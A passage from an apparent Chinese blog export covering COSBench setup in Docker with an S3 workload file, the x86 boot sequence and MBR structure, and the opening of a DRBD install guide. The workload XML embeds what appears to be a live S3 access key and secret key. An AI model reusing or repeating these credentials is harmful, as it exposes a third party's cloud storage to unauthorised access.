      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ext</tag>
      </tags>
  </entry>
  <entry>
    <title>COSBench搭建及使用</title>
    <url>/2017/07/12/storage/cosbench-usage/</url>
    <content><![CDATA[<p><img src="/images/cosbench/cosbench-usage.png" alt="cosbench-usage.png"></p>
<p>COSBench是Intel团队基于java开发，对云存储的测试工具，全称是Cloud object Storage Bench。COSBench也分控制台和发起请求的driver，且driver可以分布式部署。可以支持swift、s3、Openstack等接口</p>
<h1 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h1><p>从github上下载release版本（<code>https://github.com/intel-cloud/cosbench</code>）。解压后可以获取<code>COSBenchUserGuide.pdf</code>（只有英文版）和<code>workload</code>配置文件（<code>./conf/*.xml</code>）。</p>
<h1 id="部署-启动"><a href="#部署-启动" class="headerlink" title="部署&amp;启动"></a>部署&amp;启动</h1><p>COSBench的运行依赖于java和curl这两个包，并且调用linux的nc来做数据分析，如果没有安装nc，请手动安装。<br>本人将COSBench部署到docker中，为的是方便以后运行，不要将有限的生命耗费到无限的折腾当中。</p>
<p>docker镜像使用的是<code>centos:7.3.1611</code>，具体dockerfile如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7.3</span>.<span class="number">1611</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum update -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y java-1.8.0-openjdk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum clean all</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">19088</span> <span class="number">18088</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> ./cosbench.tar.gz /root/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> ./entry.sh /root/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/root/entry.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p><code>entry.sh</code>是容器的启动脚本，脚本中主要用于启动COSBench服务，具体实现如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./start-all.sh</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">    sleep 10s</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>完成docker镜像的生成后，使用<code>docker run -d -w /root/cosbench/ --rm -P s3test:performance</code>命令运行容器。然后通过<code>docker ps</code>查看可访问的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                COMMAND             CREATED             STATUS              PORTS                                                NAMES</span><br><span class="line">ed37db78178a        s3test:performance   &quot;/root/entry.sh&quot;    19 hours ago        Up 19 hours         0.0.0.0:32771-&gt;18088/tcp, 0.0.0.0:32770-&gt;19088/tcp   unruffled_mahavira</span><br></pre></td></tr></table></figure>

<p>在浏览器中输入<code>http://x.x.x.x:32770/controller/index.html</code>访问COSBench首页。COSBench是以”master-slave”模式运行的，19088端口对应的是master端口，18088对应的是driver端口，任务的运行是有master下发给driver，然后由driver执行的（driver可配置多个）。</p>
<p>关于<code>workload</code>配置文件的撰写请见<code>COSBenchUserGuide.pdf</code>，此处给出一个测试S3接口的例子</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">workload</span> <span class="attr">name</span>=<span class="string">&quot;S3Test&quot;</span> <span class="attr">description</span>=<span class="string">&quot;Performance&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">storage</span> <span class="attr">type</span>=<span class="string">&quot;s3&quot;</span> <span class="attr">config</span>=<span class="string">&quot;accesskey=Ltiakby8pAAbHMjpUr3L;secretkey=qMTe5ibLW49iFDEHNKqspdnJ8pwaawA9GYrBXUYc;endpoint=http://los-cn-north-2.lecloudapis.com&quot;</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">workflow</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;init&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4)&quot;</span> /&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;prepare&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;prepare&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,2);objects=r(1,800);sizes=c(4)MB&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;sequential_RO_8W_4MB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;sequential_RO_8W_4MB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;8&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;read&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(1);objects=s(1,800);size=c(4)MB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;random_RO_8W_4MB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;random_RO_8W_4MB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;8&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;read&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(2);objects=u(1,800);size=c(4)MB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;sequential_WO_8W_4MB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;sequential_WO_8W_4MB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;8&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;write&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(3);objects=s(1,800);sizes=c(4)MB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;random_WO_8W_4MB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;random_WO_8W_4MB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;8&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;write&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(4);objects=u(1,800);sizes=c(4)MB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;cleanup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;cleanup&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4);objects=r(1,800)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;dispose&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;dispose&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;init&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4)&quot;</span> /&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;prepare&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;prepare&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,2);objects=r(1,800);sizes=c(64)KB&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;sequential_RO_32W_64KB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;sequential_RO_32W_64KB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;32&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;read&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(1);objects=s(1,800);size=c(64)KB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;random_RO_32W_64KB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;random_RO_32W_64KB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;32&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;read&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(2);objects=u(1,800);size=c(64)KB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;sequential_WO_32w_64KB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;sequential_WO_32w_64KB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;32&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;write&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(3);objects=s(1,800);sizes=c(64)KB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;random_WO_32W_64KB&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">name</span>=<span class="string">&quot;random_WO_32W_64KB&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;32&quot;</span> <span class="attr">totalOps</span>=<span class="string">&quot;1600&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">operation</span> <span class="attr">type</span>=<span class="string">&quot;write&quot;</span> <span class="attr">ratio</span>=<span class="string">&quot;100&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=c(4);objects=u(1,800);sizes=c(64)KB&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">work</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;cleanup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;cleanup&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4);objects=r(1,800)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">workstage</span> <span class="attr">name</span>=<span class="string">&quot;dispose&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">work</span> <span class="attr">type</span>=<span class="string">&quot;dispose&quot;</span> <span class="attr">workers</span>=<span class="string">&quot;1&quot;</span> <span class="attr">config</span>=<span class="string">&quot;cprefix=testp;containers=r(1,4)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">workstage</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">workflow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">workload</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="问题及解决"><a href="#问题及解决" class="headerlink" title="问题及解决"></a>问题及解决</h1><ol>
<li>COSBench首页时间显示没有按东八区显示<br>  在<code>cosbench-start.sh</code>中找到<code>/usr/bin/nohup java</code>这一行，增加<code>-Duser.timezone=Asia/Shanghai</code>参数</li>
<li>COSBench在测试过程中MD5校验失败问题<br>  在测试过程中GET操作失败，而且错误日志如下：  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">2017-07-11 07:26:42,297 [INFO] [Log4jLogManager] - will append log to file /root/cosbench/log/mission/MA308B012AE.log</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp2/myobjects38</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects43</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects43</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects31</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects7</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects26</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp1/myobjects34</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp2/myobjects25</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp2/myobjects45</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp1/myobjects7</span><br><span class="line">2017-07-11 07:26:42,574 [INFO] [NoneStorage] - performing GET at /testp2/myobjects43</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp2/myobjects16</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp2/myobjects23</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp1/myobjects15</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp1/myobjects36</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp2/myobjects34</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp1/myobjects34</span><br><span class="line">2017-07-11 07:26:42,576 [INFO] [NoneStorage] - performing GET at /testp2/myobjects27</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects49</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects27</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects24</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects35</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects2</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects47</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects39</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects50</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects8</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects21</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects24</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects15</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp1/myobjects4</span><br><span class="line">2017-07-11 07:26:42,575 [INFO] [NoneStorage] - performing GET at /testp2/myobjects1</span><br><span class="line">2017-07-11 07:26:45,476 [ERROR] [AbstractOperator] - worker 8 fail to perform operation testp1/myobjects7</span><br><span class="line">com.amazonaws.AmazonClientException: Unable to verify integrity of data download.  Client calculated content hash didn&#x27;t match hash calculated by Amazon S3.  The data may be corrupt.</span><br><span class="line">   at com.amazonaws.services.s3.internal.DigestValidationInputStream.validateMD5Digest(DigestValidationInputStream.java:79)</span><br><span class="line">   at com.amazonaws.services.s3.internal.DigestValidationInputStream.read(DigestValidationInputStream.java:61)</span><br><span class="line">   at com.amazonaws.internal.SdkFilterInputStream.read(SdkFilterInputStream.java:72)</span><br><span class="line">   at com.amazonaws.services.s3.model.S3ObjectInputStream.read(S3ObjectInputStream.java:155)</span><br><span class="line">   at com.amazonaws.services.s3.model.S3ObjectInputStream.read(S3ObjectInputStream.java:147)</span><br><span class="line">   at com.intel.cosbench.driver.operator.Reader.copyLarge(Reader.java:120)</span><br><span class="line">   at com.intel.cosbench.driver.operator.Reader.doRead(Reader.java:92)</span><br><span class="line">   at com.intel.cosbench.driver.operator.Reader.operate(Reader.java:69)</span><br><span class="line">   at com.intel.cosbench.driver.operator.AbstractOperator.operate(AbstractOperator.java:76)</span><br><span class="line">   at com.intel.cosbench.driver.agent.WorkAgent.performOperation(WorkAgent.java:197)</span><br><span class="line">   at com.intel.cosbench.driver.agent.WorkAgent.doWork(WorkAgent.java:177)</span><br><span class="line">   at com.intel.cosbench.driver.agent.WorkAgent.execute(WorkAgent.java:134)</span><br><span class="line">   at com.intel.cosbench.driver.agent.AbstractAgent.call(AbstractAgent.java:44)</span><br><span class="line">   at com.intel.cosbench.driver.agent.AbstractAgent.call(AbstractAgent.java:1)</span><br><span class="line">   at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class="line">   at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">   at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">   at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">2017-07-11 07:26:45,476 [INFO] [NoneStorage] - performing GET at /testp1/myobjects14</span><br><span class="line">2017-07-11 07:26:46,880 [INFO] [NoneStorage] - performing GET at /testp2/myobjects14</span><br><span class="line">2017-07-11 07:26:49,806 [INFO] [NoneStorage] - performing GET at /testp1/myobjects43</span><br><span class="line">2017-07-11 07:26:51,514 [INFO] [NoneStorage] - performing GET at /testp2/myobjects31</span><br><span class="line">2017-07-11 07:26:54,021 [INFO] [NoneStorage] - performing GET at /testp1/myobjects5</span><br></pre></td></tr></table></figure>
  你可以通过增加<code>-Dcom.amazonaws.services.s3.disableGetObjectMD5Validation=true</code>参数来关闭MD5校验，<a href="https://github.com/intel-cloud/cosbench/issues/346">据说</a>此bug只在<code>0.4.3.c4</code>版本出现，我没验证过其它版本。</li>
</ol>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/landhu/p/5843282.html">使用COSBench工具对ceph s3接口进行压力测试</a></li>
<li><a href="https://github.com/zhoubofsy/s3test">s3test</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>COS</tag>
      </tags>
  </entry>
  <entry>
    <title>x86计算机启动过程</title>
    <url>/2015/12/19/storage/pc_start/</url>
    <content><![CDATA[<h1 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h1><ol>
<li>BIOS读取MBR(Master Boot record)</li>
<li>MBR引导Bootloader(NTLOADER or GRUB or LILO…)</li>
<li>Bootloader加载kernel</li>
<li>init进程初始化</li>
</ol>
<h1 id="MBR结构"><a href="#MBR结构" class="headerlink" title="MBR结构"></a>MBR结构</h1><ul>
<li>MBR只有512字节大小，存储在硬盘的０道０面１扇区</li>
<li>引导代码（BootCode），446 bytes</li>
<li>分区表（Partition table），64 bytes</li>
<li>Magic Number(55AA)，2 bytes</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">     -+-  +-------------------+</span><br><span class="line">      |   |                   |</span><br><span class="line">      |   |                   |</span><br><span class="line">      |   |                   |</span><br><span class="line">      |   |                   |</span><br><span class="line"><span class="number">446</span> B |   |     Boot Code     |</span><br><span class="line">      |   |                   |</span><br><span class="line">      |   |                   |</span><br><span class="line">      |   |                   |                                              </span><br><span class="line">      |   |                   |                                              </span><br><span class="line">     -+-  +-------------------+                                              </span><br><span class="line">      |   |                   |                   +-------------------------+</span><br><span class="line"> <span class="number">64</span> B |   |     Partition     |                   |        Partition <span class="number">1</span>      |</span><br><span class="line">      |   |       Table       |   ---------&gt;      +-------------------------+</span><br><span class="line">      |   |                   |                   |        Partition <span class="number">2</span>      | </span><br><span class="line">     -+-  +-------------------+                   +-------------------------+</span><br><span class="line">      |   |                   |                   |        Partition <span class="number">3</span>      |</span><br><span class="line">  <span class="number">2</span> B |   |   Magic Number    |                   +-------------------------+</span><br><span class="line">      |   |                   |                   |        Partition <span class="number">4</span>      |</span><br><span class="line">     -+-  +-------------------+                   +-------------------------+</span><br><span class="line">                                                                |</span><br><span class="line">                                                                |</span><br><span class="line">                                                                v</span><br><span class="line">                                                                 </span><br><span class="line">           +----------------+-----------+----------------+---------+-----------+------+</span><br><span class="line">           | Partition flag | Start CHS | Partition byte | End CHS | Start LBA | Size |                                  </span><br><span class="line">           +----------------+-----------+----------------+---------+-----------+------+</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li><a href="http://wenku.baidu.com/link?url=fGCk68YwJL97k5hfvXe_5FD018-q5dQvhy8emq4E7HybyPJzd9kJHMShz793BXiPT_bvETchHKxyNgBdbwvnN46In1ORPa872kbxSGwGjeO">Linux启动过程详解_MBR和GRUB概述</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>MBR</tag>
      </tags>
  </entry>
  <entry>
    <title>DRBD</title>
    <url>/2023/02/16/storage/linux-drbd-usage/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>DRBD（Distributed Replicated Block Device，分布式复制块设备)是一个用软件实现的、无共享的、服务器之间镜像块设备内容的存储复制解决方案。DRBD是镜像块设备，是按数据位镜像成一样的数据块。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="ubuntu环境"><a href="#ubuntu环境" class="headerlink" title="ubuntu环境"></a>ubuntu环境</h2><p>准备两个ubuntu系统，一个作为源端ubu1，一个作为目的端ubu2。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04.5 LTS</span><br><span class="line">Release:    20.04</span><br><span class="line">Codename:   focal</span><br><span class="line">bob@ubu1:~$ uname -a</span><br><span class="line">Linux ubu1 5.4.0-139-generic #156-Ubuntu SMP Sat Jan 21 13:46:46 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04.5 LTS</span><br><span class="line">Release:    20.04</span><br><span class="line">Codename:   focal</span><br><span class="line">bob@ubu2:~$ uname -a</span><br><span class="line">Linux ubu2 5.4.0-139-generic #156-Ubuntu SMP Sat Jan 21 13:46:46 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p><code>brbd.ko</code>为linux内核自带，不需要另行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ lsmod | grep drbd</span><br><span class="line">drbd                  434176  3</span><br><span class="line">lru_cache              20480  1 drbd</span><br><span class="line">libcrc32c              16384  4 btrfs,xfs,drbd,raid456</span><br><span class="line">bob@ubu1:~$ modinfo drbd</span><br><span class="line">filename:       /lib/modules/5.4.0-139-generic/kernel/drivers/block/drbd/drbd.ko</span><br><span class="line">alias:          block-major-147-*</span><br><span class="line">license:        GPL</span><br><span class="line">version:        8.4.11</span><br><span class="line">description:    drbd - Distributed Replicated Block Device v8.4.11</span><br><span class="line">author:         Philipp Reisner &lt;phil@linbit.com&gt;, Lars Ellenberg &lt;lars@linbit.com&gt;</span><br><span class="line">srcversion:     B438804C5AE8C84C95D0411</span><br><span class="line">depends:        lru_cache,libcrc32c</span><br><span class="line">intree:         Y</span><br><span class="line">name:           drbd</span><br><span class="line">vermagic:       5.4.0-139-generic SMP mod_unload modversions aarch64</span><br><span class="line">sig_id:         PKCS#7</span><br><span class="line">signer:         Build time autogenerated kernel key</span><br><span class="line">sig_key:        